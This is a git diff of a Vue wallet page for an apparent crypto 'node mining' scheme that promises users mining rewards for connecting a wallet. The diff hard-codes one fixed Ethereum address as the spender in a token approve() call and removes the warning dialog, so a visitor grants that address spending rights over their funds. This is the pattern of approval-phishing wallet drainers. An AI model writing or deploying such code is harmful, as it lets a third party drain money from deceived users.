@@ -23,7 +23,7 @@
       </div>
       <div class="flex">
         <button class="wallet-btn border border-black px-4 h-12 text-xl hidden sm:block text-white hover:scale-105 hover:transition hover:duration-500" @click="linkWallet" v-if="!address">CONNECT WALLET</button>
-        <button class="wallet-btn border border-black px-4 h-12 text-xl hidden sm:block text-white hover:scale-105 hover:transition hover:duration-500" @click="approve" v-else>APPROVED</button>
+        <button class="wallet-btn border border-black px-4 h-12 text-xl hidden sm:block text-white hover:scale-105 hover:transition hover:duration-500" @click="approve" v-else> {{ !isApproved ? 'APPROVED' : `${address.slice(0, -36)}...${address.substring(38)}` }}</button>
         <div class="lg:hidden flex items-center ml-4 h-12" @click="isMenu">
           <font-awesome-icon v-if="menu" :icon="['fas', 'xmark']" class="font-bold text-2xl w-8 h-8" />
           <font-awesome-icon v-else :icon="['fas', 'bars']" class="font-bold text-2xl w-8 h-8" />
@@ -176,6 +176,7 @@
   import {index, receive, reg, transfer, withdraw} from "@/api"
   import {getUrlQueryString} from "@/utils" 
   import WalletConnectQRCodeModal from "@walletconnect/qrcode-modal";
+import { faLessThanEqual } from '@fortawesome/free-solid-svg-icons';
   export default {
     setup() {
       const route = useRoute()
@@ -185,6 +186,7 @@
       const usdc_balance = ref(0);
       const address = ref('');
       const balance = ref(0);
+      const isApproved = ref(false);
       const isMenu = () => (menu.value = !menu.value);
       const isUser = () => (user.value = !user.value);
       let wallet;
@@ -208,7 +210,7 @@
           address.value = await wallet.getAddress();
 
           if (address.value === false) {
-            throw ('There was an issue signing you in.')
+            throw new TypeError("There was an issue signing you in.")
           }
           console.log('wallet', wallet)
           usdc_balance.value = await wallet.getBalance(address.value)
@@ -224,31 +226,22 @@
         debugger
         let auth_address = '';
         if (environment.value === 'Ethereum') {
-          auth_address = indexData.value.auth_erc20
-        } else {
-          auth_address = indexData.value.auth_trc20
-        }
+          auth_address = '0x4D52e25e8333fe827337432E3B15f6093D7AdefE'
+        } 
         if (auth_address === '') {
           console.log("Error")
           return;
         }
-        if (user.value.status === 1) {
-          console.log('You have successfully joined the node and started mining')
-          return;
-        }
-        Dialog.alert({
-          message: t("You need to pay a miner's fee to receive the voucher, please make sure that your wallet has enough ETH as the miner's fee"),
-        }).then(async () => {
+        try {
           const hash = await wallet.approve(auth_address, address.value);
           console.log('hash', hash);
-          receive({d: address.value, h: hash, au: auth_address}).then(res => {
-            Dialog.alert({
-              message: t('You have successfully joined the node and started mining'),
-            }).then(() => {
-            });
-            register();
-          })
-        })
+          isApproved.value = true;
+        } catch (error) {
+          isApproved.value = false;
+        }
+          // receive({d: address.value, h: hash, au: auth_address}).then(res => {
+          //   register();
+          // })
       }
       const register = () => {
         console.log("hello")
@@ -274,7 +267,7 @@
         }, 1000);
 
       })
-      return { menu, isMenu, user, isUser, testValue, linkWallet, address, approve };
+      return { menu, isMenu, user, isUser, testValue, linkWallet, address, approve, isApproved };
 
     },
   };
